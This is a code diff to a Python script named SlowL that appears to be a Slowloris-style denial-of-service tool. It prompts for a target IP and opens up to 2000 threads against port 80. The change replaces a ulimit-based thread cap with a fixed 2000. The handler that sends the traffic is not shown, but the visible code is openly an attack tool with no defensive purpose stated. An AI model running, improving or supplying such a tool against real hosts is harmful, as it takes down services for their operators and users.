@@ -2,15 +2,14 @@ import socket
 import random
 import threading
 import time
-import subprocess
 
 class SlowL:
-	def __init__(self, ip, port, maxt):
+	def __init__(self, ip, port):
 		self.ip = socket.gethostbyname(ip)
 		self.port = port
 		self.open = 0
 		while True:
-			if self.open < maxt:
+			if self.open < 2000:
 				t = threading.Thread(target=self.handler)
 				t.daemon = True
 				t.start()
@@ -35,5 +34,4 @@ class SlowL:
 
 if __name__ == '__main__':
 	ips = input("IP NOW: ")
-	mat = int(subprocess.check_output(["ulimit", "-n"]))
-	s = SlowL(ips, 80, mat)
+	s = SlowL(ips, 80)
